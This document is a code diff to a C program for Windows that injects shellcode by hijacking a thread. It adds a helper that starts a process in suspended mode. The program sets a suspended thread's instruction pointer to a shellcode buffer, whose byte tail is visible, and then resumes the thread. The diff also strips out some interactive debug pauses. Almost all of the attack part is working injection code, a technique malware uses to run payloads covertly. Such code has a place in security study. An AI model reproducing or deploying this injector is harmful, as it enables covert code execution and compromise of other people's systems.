@@ -45,6 +45,32 @@ unsigned char shellcode[] =
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
 
+/*
+BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName,
+  [in, out, optional] LPSTR                 lpCommandLine,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags,
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+*/
+
+BOOL CreateSuspendedprocess(LPCWSTR szProcessPath, OUT PROCESS_INFORMATION* pProcInfo) {
+	STARTUPINFOW si = { 0 };
+	si.cb = sizeof(si);
+	if (!CreateProcessW(szProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pProcInfo)) {
+		error("CreateProcessW Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	return TRUE;
+}
+
+
 BOOL ThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 	CONTEXT  ThreadCtx = { // thread context struct
 		.ContextFlags = CONTEXT_CONTROL
@@ -91,8 +117,6 @@ BOOL ThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSiz
 
 	// Updating the next instruction pointer to be equal to the payload's address 
 	ThreadCtx.Rip = (DWORD64)lpAddress;
-	info("Thread Context Updated, RIP set to the shellcode address: 0x%p, press ENTER\n", lpAddress);
-	getchar();
 
 	// in 32bits:
 	//ThreadCtx.Eip = (DWORD)lpAddress;
@@ -102,8 +126,6 @@ BOOL ThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSiz
 		error("SetThreadContext Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	info("New Thread Context Set, the thread will execute the shellcode once resumed, press ENTER\n");
-	getchar();
 	return TRUE;
 }
 
@@ -120,7 +142,7 @@ int main() {
 	info("memory address of the shellcode in the .data section: %p, press ENTER\n", shellcode);
 	getchar();
 
-	
+
 	// Create a thread (not the main thread) in a SUSPENDED mode and setting the start address to a dummy function
 	HANDLE stoopidSacrificialRitualThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sertARien, NULL, CREATE_SUSPENDED, NULL);
 	info("Thread created, Handle: %p | TID: %lu\n", stoopidSacrificialRitualThread, GetThreadId(stoopidSacrificialRitualThread));
@@ -135,7 +157,6 @@ int main() {
 
 
 	// fire up
-	// resume the thread with the brand new RIP pointing to the shellcode
 	ResumeThread(stoopidSacrificialRitualThread);
 
 
